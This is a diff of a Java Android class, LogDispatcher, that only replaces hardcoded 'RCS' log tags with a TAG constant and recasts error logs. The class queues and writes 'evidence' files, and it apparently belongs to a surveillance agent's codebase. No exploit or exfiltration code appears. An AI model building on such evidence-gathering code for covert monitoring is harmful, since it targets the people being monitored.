@@ -83,7 +83,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	private void processQueue() {
 		Packet p;
-		// Log.d("RCS", "processQueue() Packets in Queue: " + q.size());
+		// Log.d(TAG, "processQueue() Packets in Queue: " + q.size());
 
 		if (q.size() == 0) {
 			return;
@@ -98,42 +98,42 @@ public class LogDispatcher extends Thread implements Runnable {
 
 		switch (p.getCommand()) {
 			case LogR.LOG_CREATE:
-				Log.d("RCS", "processQueue() got LOG_CREATE");
+				Log.d(TAG, "processQueue() got LOG_CREATE");
 				createLog(p);
 				break;
 
 			case LogR.LOG_ATOMIC:
-				Log.d("RCS", "processQueue() got LOG_ATOMIC");
+				Log.d(TAG, "processQueue() got LOG_ATOMIC");
 				atomicLog(p);
 				break;
 
 			case LogR.LOG_WRITE:
-				Log.d("RCS", "processQueue() got LOG_WRITE");
+				Log.d(TAG, "processQueue() got LOG_WRITE");
 				writeLog(p);
 				break;
 
 			case LogR.LOG_CLOSE:
-				Log.d("RCS", "processQueue() got LOG_CLOSE");
+				Log.d(TAG, "processQueue() got LOG_CLOSE");
 				closeLog(p);
 				break;
 
 			case LogR.LOG_REMOVE:
-				Log.e("RCS", "processQueue() got LOG_REMOVE: DEPRECATED");
+				Log.d(TAG,"Error: " + "processQueue() got LOG_REMOVE: DEPRECATED");
 				// removeLog(p);
 				break;
 
 			case LogR.LOG_REMOVEALL:
-				Log.e("RCS", "processQueue() got LOG_REMOVEALL: DEPRECATED");
+				Log.d(TAG,"Error: " + "processQueue() got LOG_REMOVEALL: DEPRECATED");
 				// removeAll();
 				break;
 
 			case LogR.LOG_WRITEMRK:
-				Log.d("RCS", "processQueue() got LOG_WRITEMRK");
+				Log.d(TAG, "processQueue() got LOG_WRITEMRK");
 				writeMarkup(p);
 				break;
 
 			default:
-				Log.e("RCS", "processQueue() got LOG_UNKNOWN");
+				Log.d(TAG,"Error: " + "processQueue() got LOG_UNKNOWN");
 				break;
 		}
 
@@ -164,7 +164,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	@Override
 	public void run() {
-		Log.d("RCS", "LogDispatcher started");
+		Log.d(TAG, "LogDispatcher started");
 
 		// Create log directory
 		sdDir = new File(Path.logs());
@@ -185,7 +185,7 @@ public class LogDispatcher extends Thread implements Runnable {
 				if (halt == true) {
 					q.clear();
 					evidences.clear();
-					Log.d("RCS", "LogDispatcher closing");
+					Log.d(TAG, "LogDispatcher closing");
 					return;
 				}
 
@@ -262,7 +262,7 @@ public class LogDispatcher extends Thread implements Runnable {
 
 			return true;
 		} catch (final Exception e) {
-			Log.d("RCS", "LogDispatcher.createLog() exception detected");
+			Log.d(TAG, "LogDispatcher.createLog() exception detected");
 			e.printStackTrace();
 			return false;
 		}
